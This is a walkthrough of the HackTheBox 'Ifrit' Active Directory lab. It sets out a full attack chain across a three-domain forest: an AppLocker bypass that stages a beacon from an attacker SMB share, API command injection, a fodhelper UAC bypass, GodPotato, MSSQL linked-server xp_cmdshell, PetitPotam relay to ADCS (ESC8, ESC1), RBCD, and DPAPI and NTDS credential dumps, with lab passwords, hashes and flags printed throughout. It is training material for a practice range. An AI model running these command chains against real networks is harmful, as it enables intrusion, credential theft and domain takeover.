---
title: "Ifrit Pro Lab"
description: "HackTheBox Ifrit Pro Lab — full walkthrough of a 3-domain AD forest: RDP foothold, GitLab-leaked API RCE, MSSQL linked servers, ADCS ESC1/ESC8, RBCD, DPAPI, and cross-domain trust to forest root."
pageIcon: "https://app.hackthebox.com/images/icons/ic-prolabs/ic-ifrit-overview.svg"
---

**Ifrit** is a HackTheBox Active Directory Pro Lab modelling a **three-domain
forest** — root `ifrit.vl` with child domains `eu-ifrit.vl` and `it-ifrit.vl`.
Starting from a provided RDP account on **VDI02**, the path runs through a
GitLab-leaked internal API, an MSSQL linked-server bridge across the domain
trust, an ADCS certificate chain (ESC8 → ESC1), resource-based constrained
delegation, and DPAPI credential looting — ending in **full forest compromise**.

## Attack path

<div style="max-width:660px;margin:1.5rem auto;font-family:system-ui,-apple-system,sans-serif;font-size:.9rem;">
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #94a3b8;background:rgba(255,255,255,.045);">
    <b style="color:#fff;min-width:88px;">VDI02</b><span style="color:#cbd5e1;">RDP with provided account · Ligolo pivot into the network</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #94a3b8;background:rgba(255,255,255,.045);">
    <b style="color:#fff;min-width:88px;">Loot</b><span style="color:#cbd5e1;"><code>home-backups$</code> → Firefox → <code>jack.smith</code> → GitLab → <code>dev:dev-5381</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:88px;">DEV05</b><span style="color:#cbd5e1;">API RCE → fodhelper UAC → GodPotato → SYSTEM</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:88px;">SQL03</b><span style="color:#cbd5e1;">impersonate <code>dev</code> → linked server → <b>SQL07</b> (crosses the trust)</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #fbbf24;background:rgba(251,191,36,.06);">
    <b style="color:#fff;min-width:88px;">SQL07</b><span style="color:#cbd5e1;">impersonate <code>sa</code>/<code>adm</code> → xp_cmdshell → SeManageVolume → SYSTEM</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #fbbf24;background:rgba(251,191,36,.06);">
    <b style="color:#fff;min-width:88px;">FS02</b><span style="color:#cbd5e1;">PetitPotam + ntlmrelayx → ADCS <b>ESC8</b> → <code>FS02$</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #fbbf24;background:rgba(251,191,36,.06);">
    <b style="color:#fff;min-width:88px;">DC07</b><span style="color:#cbd5e1;"><b>ESC1</b> (IT-Computers) → <code>it-ifrit.vl</code> Domain Admin</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #94a3b8;background:rgba(255,255,255,.045);">
    <b style="color:#fff;min-width:88px;">VDI02 ↺</b><span style="color:#cbd5e1;"><code>Sheila.Richards</code> (vdi-admins) → DPAPI → <code>ifrit.vl\administrator</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:88px;">DC03</b><span style="color:#cbd5e1;"><code>VDI02$</code> WriteAccountRestrictions → <b>RBCD</b> → <code>eu-ifrit.vl</code> DA</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(248,113,113,.4);border-left:4px solid #f87171;background:rgba(248,113,113,.08);">
    <b style="color:#fff;min-width:88px;">DC01</b><span style="color:#fca5a5;font-weight:600;"><code>ifrit.vl\administrator</code> → FOREST OWNED</span>
  </div>
</div>

## Environment

Nine live hosts across the three domains (`172.16.41.0/24`):

| Host | IP | Domain | Role |
| --- | --- | --- | --- |
| DC01 | .11 | `ifrit.vl` | Forest root DC |
| DC03 | .14 | `eu-ifrit.vl` | Child DC |
| DC07 | .17 | `it-ifrit.vl` | Child DC |
| DEV05 | .40 | `eu-ifrit.vl` | Internal API host |
| SQL03 | .250 | `eu-ifrit.vl` | MSSQL 2022 |
| SQL07 | .251 | `it-ifrit.vl` | MSSQL 2022 (linked) |
| FS02 | .210 | `it-ifrit.vl` | File server |
| VDI02 | .225 | (eu) | Entry / VDI |
| — | .150 | Linux | GitLab · SIEM · Squid |

:::note[Out of scope]
`PWM` (.215) is not part of the path. The **SIEM** (Elasticsearch `:9200`) is a
read-only dashboard for players to check their stealth, and the **Squid proxy**
(`:3128`) is the *intended* pivot into the network — I used **Ligolo** from
VDI02 instead.
:::

## Initial Access — VDI02

The lab grants auto-generated domain accounts (e.g. `caroline.hunter:PenEuIfrit527#`).
**RDP into VDI02** with a provided account and drop a **Ligolo** agent to route
the whole `172.16.41.0/24` through it.

VDI02 enforces **AppLocker**. Enumerating the effective policy shows the default
`C:\Windows` path rule is intact — anything under it is allowed to execute. So
generate a Sliver beacon, serve it over SMB from the attacker box, and stage it
into an allowed path (`C:\Windows\Temp`):

```powershell title="AppLocker bypass — execute from C:\Windows"
Get-AppLockerPolicy -Effective -Xml    # confirms C:\Windows\* is allowed

# attacker: host the beacon over SMB
impacket-smbserver share . -smb2support

# on VDI02 — copy into the allowed path and run
copy \\10.10.14.8\share\beacon.exe C:\Windows\Temp\beacon.exe
C:\Windows\Temp\beacon.exe
```

BloodHound data is collected over LDAP with the provided account (converted with
`ldapsearch_parser` / `bofhound`):

```bash title="LDAP collection"
ldapsearch -LLL -H ldap://dc03.eu-ifrit.vl -D 'EU-IFRIT\caroline.hunter' -w 'PenEuIfrit527#' \
  -b "DC=EU-IFRIT,DC=VL" -N -o ldif-wrap=no \
  -E '!1.2.840.113556.1.4.801=::MAMCAQc=' "(&(objectClass=*))" | tee objects.txt
```

## Foothold creds — backups share & GitLab

From VDI02's File Explorer, a DC exposes a **`home-backups$`** share containing a
backup `.vhdx`. Mounting it and pulling the Firefox profile's `login.json` yields:

```text title="Firefox login.json"
jack.smith : JigokuNoKaen10
```

Those creds log into a **private GitLab repo** on `172.16.41.150`. Reading the
application source reveals the internal DEV05 API — a command-exec endpoint on
port **13300** and its service credentials:

```text title="GitLab source → DEV05 API"
http://172.16.41.40:13300   ·   /api/info   /api/query
dev : dev-5381
```

## DEV05 — API RCE to SYSTEM

The `/api/query` endpoint runs shell commands. Confirm execution as `jack.smith`
(a local admin):

```bash title="Command injection via the API"
curl -u dev:dev-5381 -X POST http://172.16.41.40:13300/api/query \
  -H "Content-Type: application/json" \
  -d '{"query": "process get name,processid && whoami"}'
```

Launch a Sliver beacon (base64-encoded `Start-Process` of a staged `beacon.exe`),
then bypass UAC with **fodhelper** to get a high-integrity context:

```powershell title="fodhelper UAC bypass"
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -Value "" -Force
Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "(default)" -Value "C:\Users\jack.smith\beacon.exe" -Force
Start-Process fodhelper.exe
```

`SeBackup` is disabled but **`SeImpersonate`** is enabled — **GodPotato** to
SYSTEM (run once from disk before AV eats it, re-launching the beacon):

```powershell title="GodPotato → SYSTEM"
.\GodPotato-NET4.exe -cmd "powershell Start-Process -Filepath C:\Users\jack.smith\beacon.exe -WindowStyle Hidden"
```

Dump secrets. LSA gives `jack.smith`'s cleartext password and cached creds:

```text title="nxc --lsa (DEV05)"
eu-ifrit.vl\jack.smith : DXt9boDb8W_doj
EU-IFRIT.VL/Jack.Smith:$DCC2$10240#Jack.Smith#e91ef28726c30869c90c217a57944c5d
EU-IFRIT\DEV05$:aad3b435b51404eeaad3b435b51404ee:61d1921b0c09e72ab6d3fe2406253474
```

> 🚩 DEV05 flag `IFRIT{30aef3a3ade21f16f0b4d87f56840072}`

## SQL03 → SQL07 — MSSQL linked servers across the trust

`jack.smith`'s password authenticates to **SQL03** (eu-ifrit). `Jack.Smith` can
**impersonate the `dev` login**, and `dev` owns a **linked server to SQL07**
(it-ifrit) mapped as `bridge_it`:

```text title="enum_impersonate / enum_links (SQL03)"
EU-IFRIT\Jack.Smith  can IMPERSONATE  ->  dev
dev  ->  linked server  SQL07.IT-IFRIT.VL   (remote login: bridge_it)
```

On SQL07, `bridge_it` can impersonate `sa`, and the real sysadmin is `adm`.
Chaining the impersonations over the link enables `xp_cmdshell`:

```sql title="Linked-server RCE on SQL07"
EXECUTE AS LOGIN = 'dev';
EXECUTE ('EXECUTE AS LOGIN = ''adm''; EXEC sp_configure ''show advanced options'',1; RECONFIGURE;
         EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [SQL07.IT-IFRIT.VL];
EXECUTE ('EXECUTE AS LOGIN = ''adm''; EXEC xp_cmdshell ''whoami''') AT [SQL07.IT-IFRIT.VL];
-- nt service\mssqlserver
```

## SQL07 — SeManageVolume to SYSTEM

`mssqlserver` holds `SeImpersonate` (GodPotato didn't land here) **and**
`SeManageVolume` — the **SeManageVolume exploit** wins, granting SYSTEM. From
there, harvest the `SQL07$` machine identity via Rubeus + Certipy:

```bash title="SQL07$ machine credential"
# in-beacon: Rubeus tgtdeleg to get a usable ticket
execute-assembly Rubeus.exe -- tgtdeleg /nowrap
# request a machine cert and pull the NT hash
certipy req  -k -no-pass -u 'SQL07$@it-ifrit.vl' -dc-ip 172.16.41.17 -ca 'it-ifrit-CA' -template Machine -target DC07.it-ifrit.vl
certipy auth -pfx sql07.pfx -dc-ip 172.16.41.17
# -> SQL07$ hash
```

> 🚩 SQL07 flag `IFRIT{9f27c845ed6494f977aaf249e90c69cc}`

## FS02 — PetitPotam + ADCS ESC8

The `it-ifrit-CA` exposes **web enrollment over HTTP with no channel binding
(ESC8)**. Relay a coerced machine authentication to the CA to mint a cert for
FS02, then recover its hash:

```bash title="ESC8 relay to mint FS02's certificate"
# terminal 1 — relay to ADCS web enrollment
ntlmrelayx.py -t http://172.16.41.17/certsrv/certfnsh.asp -smb2support --adcs --template Machine --no-http-server
# terminal 2 — coerce FS02 to authenticate (as SQL07$)
python3 PetitPotam.py -u 'SQL07$' -hashes :6a2072c8773a675ef5cc28e7efb0300b -d it-ifrit.vl 10.10.14.8 172.16.41.210
```

```text title="FS02$ hash from the cert"
certipy auth -pfx FS02.pfx -dc-ip 172.16.41.17
-> fs02$@it-ifrit.vl : 8d7b0500b8c2155faafb61e5ef7381b2
```

FS02 has enrollment rights on the **`IT-Computers`** template, which is
`EnrolleeSuppliesSubject` + client-auth — a textbook **ESC1**.

## DC07 — ESC1 to it-ifrit Domain Admin

Use `FS02$` to enroll in `IT-Computers`, supplying a UPN of
`Administrator@it-ifrit.vl`, and authenticate as the domain admin:

```bash title="ESC1 → Administrator@it-ifrit.vl"
getTGT.py -hashes :8d7b0500b8c2155faafb61e5ef7381b2 'it-ifrit.vl/FS02$' -dc-ip 172.16.41.17
certipy req -k -no-pass -u 'FS02$@it-ifrit.vl' -dc-ip 172.16.41.17 -ca 'it-ifrit-CA' \
  -template 'IT-Computers' -target DC07.it-ifrit.vl \
  -upn 'Administrator@it-ifrit.vl' -dc-host DC07.it-ifrit.vl -key-size 4096
certipy auth -pfx administrator.pfx -dc-ip 172.16.41.17
# -> it-ifrit.vl\Administrator : 6b6b265c14e20192eb6a6dbb0a1426ba
```

Dump NTDS — this domain owns `Sheila.Richards` (member of `vdi-admins`) and the
`EU-IFRIT$` trust key:

```text title="NTDS (DC07, trimmed)"
krbtgt:502:...:86225470b55ad07a4528cf442b1fff0c
it-ifrit.vl\Sheila.Richards:1110:...:084fa60567c6b124d0a4ca54fac5d3ce
EU-IFRIT$:1103:...:9770a6626fa64b847e95fbfcefc7f219   # inter-domain trust
```

> 🚩 DC07 flag `IFRIT{0bdd04482d51c7250097c0a149887fa0}` — `it-ifrit.vl` owned.

## VDI02 (revisit) — Sheila.Richards & DPAPI to root DA

`Sheila.Richards` is in `vdi-admins`, which is **local admin on VDI02**. Dump
SAM/LSA and, crucially, **DPAPI**:

```bash title="Loot VDI02 as Sheila.Richards"
nxc smb 172.16.41.225 -u 'it-ifrit\Sheila.Richards' -H 084fa60567c6b124d0a4ca54fac5d3ce --sam --lsa
```

DPAPI decryption yields the **root forest** administrator credentials:

```text title="DPAPI"
ifrit.vl\administrator : GoldenBuddaRests85
```

## DC03 — RBCD to eu-ifrit Domain Admin

BloodHound flags that **`VDI02$` has `WriteAccountRestrictions` on `DC03`** —
set up **resource-based constrained delegation** and impersonate Administrator:

```bash title="RBCD → DC03"
rbcd.py -delegate-from 'VDI02$' -delegate-to 'DC03$' -action write \
  -dc-ip 172.16.41.14 'eu-ifrit/VDI02$' -hashes ':31056cc492be3f4ea7a0134d49014a87'
getST.py -spn 'cifs/DC03.eu-ifrit.vl' -impersonate Administrator \
  -hashes ':31056cc492be3f4ea7a0134d49014a87' -dc-ip 172.16.41.14 'eu-ifrit/VDI02$'
nxc smb 172.16.41.14 --use-kcache --sam --lsa --ntds   # eu-ifrit.vl owned
```

## DC01 — forest root

The DPAPI-recovered `ifrit.vl\administrator` is a **forest Enterprise Admin** —
it authenticates straight to the root DC:

```text title="DC01 (ifrit.vl)"
nxc smb 172.16.41.11 -u Administrator -p 'GoldenBuddaRests85' --sam
[+] ifrit.vl\Administrator:GoldenBuddaRests85 (Pwn3d!)
```

**Forest owned.** 🏁

## Takeaways

- **Secrets in backups & repos are the foothold.** A readable `home-backups$`
  share and a private GitLab repo handed over every credential needed to start.
- **MSSQL linked servers ignore domain boundaries.** The SQL03→SQL07 link +
  impersonation chain crossed the `eu-ifrit` → `it-ifrit` trust with pure T-SQL.
- **ADCS is a domain-takeover engine.** ESC8 (relay) bootstrapped a machine
  identity, and ESC1 (EnrolleeSuppliesSubject) turned it into a DA cert.
- **Delegation + DPAPI bridge the domains.** `WriteAccountRestrictions`→RBCD took
  eu-ifrit, and DPAPI on a shared VDI leaked the forest-root admin — game over.
